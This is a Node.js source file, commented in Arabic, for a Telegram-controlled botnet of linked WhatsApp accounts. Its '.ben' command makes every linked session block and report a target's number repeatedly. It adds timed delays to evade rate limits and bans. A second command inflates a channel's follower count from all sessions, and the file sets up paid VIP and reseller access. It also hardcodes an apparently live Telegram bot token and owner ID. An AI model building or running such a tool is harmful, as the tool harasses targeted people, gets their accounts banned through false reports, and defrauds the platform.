/**
 * 👑 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑼𝑳𝑻𝑹𝑨 𝑽𝑰𝑷 - 𝑻𝑯𝑬 𝑴𝑰𝑮𝑯𝑻𝒀 𝑬𝑫𝑰𝑻𝑰𝑶𝑵 👑
 * النسخة الجبارة - استقرار 100% + هجوم ذكي + لوحة تحكم متكاملة
 */

const { Telegraf, Markup } = require('telegraf');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    makeCacheableSignalKeyStore,
    jidNormalizedUser,
    delay // أداة التأخير الذكي لحماية الأرقام
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const pino = require('pino');
const express = require('express');

// ==========================================
// 🌐 خادم الويب (بقاء السيرفر حياً 24/7)
// ==========================================
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('👑 TARZAN BEN VIP DOOMSDAY IS ONLINE 😈'));
app.listen(PORT, () => console.log(`🌐 Web Server running on port ${PORT}`));

// ==========================================
// ⚙️ إعدادات الزعيم (ضع بياناتك هنا)
// ==========================================
const TG_TOKEN = '8831436238:AAF9M5hGwNbQwfoLKOr_XYS2Qij6WOA7Krw'; 
const OWNER_ID = '8794826397'; 
const DB_FILE = './tarzan_master_db.json';

// تهيئة قاعدة البيانات القوية
let db = { config: { mode: 'FREE' }, users: {}, sessions: {} };
if (fs.existsSync(DB_FILE)) {
    try { db = { ...db, ...JSON.parse(fs.readFileSync(DB_FILE)) }; } 
    catch (e) { console.error("⚠️ خطأ في قراءة قاعدة البيانات، تم البدء ببيانات جديدة."); }
}
const saveDB = () => fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));

const activeSockets = {}; 
const userStates = {}; 

// ==========================================
// 🔥 محرك الواتساب (أسلحة الدمار الشامل)
// ==========================================

async function startWhatsAppSession(sessionId, phoneNumber = null, tgContext = null) {
    const sessionDir = path.join(__dirname, 'sessions', sessionId);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    
    const sock = makeWASocket({
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: ["Tarzan Ultra VIP", "Chrome", "110.0.0"],
        generateHighQualityLinkPreview: true
    });

    activeSockets[sessionId] = sock;
    sock.ev.on('creds.update', saveCreds);

    // 🔑 توليد كود الربط للمستخدمين الجدد
    if (phoneNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(phoneNumber.replace(/[^0-9]/g, ''));
                if (tgContext) {
                    await tgContext.replyWithHTML(
                        `<b>🔱 تم تجهيز كود الربط الملكي 🔱</b>\n\n` +
                        `🔑 الكود: <code>${code}</code>\n\n` +
                        `⚠️ <b>التعليمات:</b>\n` +
                        `1. افتح الواتساب الرسمي.\n` +
                        `2. الأجهزة المرتبطة > ربط جهاز.\n` +
                        `3. اختر (الربط برقم هاتف).\n` +
                        `4. أدخل الكود وستنضم لجيش طرزان.`
                    );
                }
            } catch (e) {
                if (tgContext) await tgContext.reply("❌ تعذر إنتاج الكود، تأكد من صحة الرقم أو حاول مجدداً.");
            }
        }, 3000);
    }

    // ⚔️ استقبال أوامر الهجوم عبر الواتساب
    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const from = msg.key.remoteJid;
        const body = (msg.message.conversation || msg.message.extendedTextMessage?.text || '').trim();

        // 💀 أمر الإبادة (.ben)
        if (body.startsWith('.ben ')) {
            const target = body.split(' ')[1];
            if (!target) return;
            const targetJid = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            
            await sock.sendMessage(from, { text: `⚔️ <b>𝑻𝑨𝑹𝒁𝑨𝑵 𝑫𝑶𝑶𝑴𝑺𝑫𝑨𝒀</b> ⚔️\n\n🎯 <b>الهدف:</b> ${target}\n💀 <b>العملية:</b> جاري القصف بـ 10 بلاغات مركزة من جميع حسابات الجيش...` }, { quoted: msg });

            let totalHits = 0;
            const armySize = Object.keys(activeSockets).length;

            for (const sId in activeSockets) {
                for (let i = 0; i < 10; i++) {
                    try {
                        await activeSockets[sId].updateBlockStatus(targetJid, 'block');
                        await activeSockets[sId].reportSpam(targetJid);
                        totalHits++;
                        await delay(250); // ⏱️ تأخير ذكي لحماية أرقامك من الحظر العكسي
                    } catch (e) {}
                }
            }
            await sock.sendMessage(from, { text: `✅ <b>اكتملت الإبادة!</b>\n\n🔥 عدد البلاغات المُسددة: ${totalHits}\n👥 عدد الحسابات المُشاركة: ${armySize}\n\n<i>تم سحق الهدف بنجاح 😈</i>` }, { quoted: msg });
        }

        // 📢 أمر رفع المتابعين (.متابعه)
        if (body.startsWith('.متابعه ') || body.startsWith('.متابعة ')) {
            const link = body.split(' ')[1];
            if (!link || !link.includes('whatsapp.com/channel/')) {
                return sock.sendMessage(from, { text: '⚠️ رابط غير صالح! استخدم: .متابعه https://whatsapp.com/channel/...' });
            }
            const inviteCode = link.split('channel/')[1].split('/')[0];
            
            await sock.sendMessage(from, { text: `🔄 <b>𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑶𝑺𝑻</b> 🔄\n\n⏳ جاري إرسال الدعم من كل الجلسات...` }, { quoted: msg });

            let count = 0;
            for (const sId in activeSockets) {
                try {
                    const meta = await activeSockets[sId].newsletterMetadata("invite", inviteCode);
                    if (meta?.id) {
                        await activeSockets[sId].newsletterFollow(meta.id);
                        count++;
                        await delay(500); // ⏱️ تجنب حظر الـ Rate Limit
                    }
                } catch (e) {}
            }
            await sock.sendMessage(from, { text: `✅ <b>اكتمل الدعم الملكي!</b>\n\n📈 الحسابات التي تابعت القناة: ${count} حساب.` }, { quoted: msg });
        }
    });

    // 🔄 معالجة استقرار الاتصال
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            if (statusCode === DisconnectReason.loggedOut) {
                // المستخدم سجل خروج، نقوم بحذف الجلسة نهائياً لتنظيف السيرفر
                console.log(`❌ Session Logged Out & Deleted: ${sessionId}`);
                delete activeSockets[sessionId];
                delete db.sessions[sessionId];
                fs.rmSync(sessionDir, { recursive: true, force: true });
                saveDB();
            } else {
                // محاولة إعادة الاتصال التلقائي
                setTimeout(() => startWhatsAppSession(sessionId), 5000);
            }
        } else if (connection === 'open') {
            console.log(`✅ [ARMY ACTIVE] Session: ${sessionId}`);
            
            if (!db.sessions[sessionId]) db.sessions[sessionId] = {};
            if (!db.sessions[sessionId].welcomeSent) {
                try {
                    const selfJid = jidNormalizedUser(sock.user.id);
                    await sock.sendMessage(selfJid, { text: `👑 <b>أهلاً بك في جيش 𝑻𝑨𝑹𝒁𝑨𝑵 𝑼𝑳𝑻𝑹𝑨</b> 👑\n\nتم تسليح هذا الرقم بنجاح!\nأرسل <code>.ben رقم_الضحية</code> لبدء الهجوم.\nأرسل <code>.متابعه رابط_القناة</code> للدعم.` });
                    db.sessions[sessionId].welcomeSent = true;
                    saveDB();
                } catch (e) {}
            }
        }
    });
}

// ==========================================
// 📱 لوحة التحكم (Telegram C2)
// ==========================================
const bot = new Telegraf(TG_TOKEN);

// معالج الأخطاء لحماية البوت من الموت
bot.catch((err, ctx) => {
    console.error(`[TG Error]`, err.message);
});

bot.start((ctx) => {
    const uid = ctx.from.id.toString();
    const isOwner = uid === OWNER_ID;
    const user = db.users[uid];
    const role = isOwner ? 'OWNER' : (user ? user.role : 'GUEST');

    if (db.config.mode === 'PAID' && role === 'GUEST') {
        return ctx.replyWithHTML("❌ <b>غير مصرح!</b>\nالنظام مغلق للمشتركين (VIP) فقط.");
    }

    const roleName = { 'OWNER': '👑 الزعيم الأكبر', 'RESELLER': '💎 موزع معتمد', 'USER': '👤 عضو VIP', 'GUEST': '🆓 مستخدم عادي' }[role];
    const armySize = Object.keys(activeSockets).length;

    let buttons = [
        [Markup.button.callback('🔗 ربط رقم وتجنيده', 'action_pair')],
        [Markup.button.callback('📊 فحص قوة الجيش', 'server_status')]
    ];

    if (role === 'OWNER' || role === 'RESELLER') {
        buttons.push([Markup.button.callback('🎫 تفعيل اشتراك VIP', 'action_add_vip')]);
    }
    
    if (role === 'OWNER') {
        buttons.push([Markup.button.callback('🎖️ ترقية إلى موزع', 'action_add_reseller')]);
        buttons.push([
            Markup.button.callback(db.config.mode === 'FREE' ? '🟢 المجاني مفعل' : '🔓 تفعيل المجاني', 'mode_free'), 
            Markup.button.callback(db.config.mode === 'PAID' ? '🔴 المدفوع مفعل' : '🔐 تفعيل المدفوع', 'mode_paid')
        ]);
    }

    ctx.replyWithHTML(
        `🔱 <b>𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑼𝑳𝑻𝑹𝑨 𝑪𝑶𝑵𝑻𝑹𝑶𝑳</b> 🔱\n\n` +
        `👤 <b>الرتبة:</b> <code>${roleName}</code>\n` +
        `🛡️ <b>نظام الحماية:</b> <code>نشط (Anti-Ban)</code>\n` +
        `⚔️ <b>قوة الجيش:</b> <code>${armySize}</code> رقم جاهز للقصف\n\n` +
        `<i>اختر أمرك يا سيدي:</i>`,
        Markup.inlineKeyboard(buttons)
    );
});

// --- معالجات الأزرار ---
bot.action('action_pair', (ctx) => {
    userStates[ctx.from.id] = { action: 'WAIT_PHONE' };
    ctx.replyWithHTML("📱 <b>أرسل رقم الهاتف المراد تجنيده الآن:</b>\n(أرسل الرقم مع مفتاح الدولة، مثال: 967733...)");
});

bot.action('action_add_vip', (ctx) => {
    userStates[ctx.from.id] = { action: 'WAIT_USER_ID' };
    ctx.replyWithHTML("🎫 <b>أرسل آيدي (ID) التلجرام الخاص بالشخص:</b>");
});

bot.action('action_add_reseller', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID) return;
    userStates[ctx.from.id] = { action: 'WAIT_RESELLER_ID' };
    ctx.replyWithHTML("💎 <b>أرسل آيدي (ID) الموزع الجديد:</b>");
});

bot.action('server_status', (ctx) => {
    const armySize = Object.keys(activeSockets).length;
    ctx.replyWithHTML(
        `📊 <b>تقرير السيرفر المباشر:</b>\n\n` +
        `🟢 <b>الخادم:</b> مستقر (Express Node)\n` +
        `🟢 <b>التلجرام:</b> متصل\n` +
        `🟢 <b>الجلسات النشطة:</b> ${armySize} جلسة واتساب\n` +
        `🟢 <b>وضع النظام:</b> ${db.config.mode}`
    );
});

bot.action('mode_free', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID) return;
    db.config.mode = 'FREE'; saveDB();
    ctx.replyWithHTML("🔓 <b>تم تحويل النظام للوضع المجاني.</b>");
});

bot.action('mode_paid', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID) return;
    db.config.mode = 'PAID'; saveDB();
    ctx.replyWithHTML("🔐 <b>تم تحويل النظام للوضع المدفوع (VIP فقط).</b>");
});

// --- معالجة الإدخال النصي ---
bot.on('text', async (ctx) => {
    const uid = ctx.from.id;
    const state = userStates[uid];
    if (!state) return;

    const text = ctx.message.text.trim();

    if (state.action === 'WAIT_PHONE') {
        const phone = text.replace(/[^0-9]/g, '');
        if (phone.length < 10) return ctx.replyWithHTML("❌ <b>رقم غير صالح.</b> تأكد من الرمز الدولي.");
        
        ctx.replyWithHTML("⏳ <b>جاري الاتصال بسيرفرات واتساب لجلب كود ملكي...</b>");
        const sId = `SESSION_${Date.now()}`;
        db.sessions[sId] = { ownerTgId: uid, phone: phone };
        saveDB();
        
        await startWhatsAppSession(sId, phone, ctx);
        delete userStates[uid];
    } 
    else if (state.action === 'WAIT_USER_ID') {
        db.users[text] = { role: 'USER', addedBy: uid, date: new Date().toISOString() };
        saveDB();
        ctx.replyWithHTML(`✅ <b>نجاح:</b> تم تفعيل اشتراك VIP للآيدي <code>${text}</code>`);
        delete userStates[uid];
    }
    else if (state.action === 'WAIT_RESELLER_ID') {
        db.users[text] = { role: 'RESELLER', addedBy: uid, date: new Date().toISOString() };
        saveDB();
        ctx.replyWithHTML(`💎 <b>نجاح:</b> تم تعيين الآيدي <code>${text}</code> كموزع.`);
        delete userStates[uid];
    }
});

// ==========================================
// 🚀 إقلاع النظام الجبار
// ==========================================
const initSystem = async () => {
    console.log("===================================");
    console.log("🔥 TARZAN ULTRA VIP - THE MIGHTY EDITION 🔥");
    console.log("===================================");
    
    const sDir = path.join(__dirname, 'sessions');
    if (!fs.existsSync(sDir)) fs.mkdirSync(sDir);
    
    // استعادة الجيش (الجلسات المحفوظة)
    const folders = fs.readdirSync(sDir).filter(f => fs.lstatSync(path.join(sDir, f)).isDirectory());
    for (const f of folders) {
        try {
            await startWhatsAppSession(f);
            await delay(1000); // تأخير لتخفيف الحمل أثناء تشغيل عدة جلسات
        } catch (e) {
            console.error(`⚠️ فشل إقلاع الجلسة ${f}`);
        }
    }
    
    bot.launch().then(() => console.log("✅ مركز قيادة التلجرام يعمل بكفاءة."));
};

initSystem();

// جدار حماية لمنع إغلاق السيرفر بسبب الأخطاء المفاجئة
process.on('uncaughtException', (err) => console.error('[Uncaught Exception]', err.message));
process.on('unhandledRejection', (err) => console.error('[Unhandled Rejection]', err.message));

// الإغلاق الآمن
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
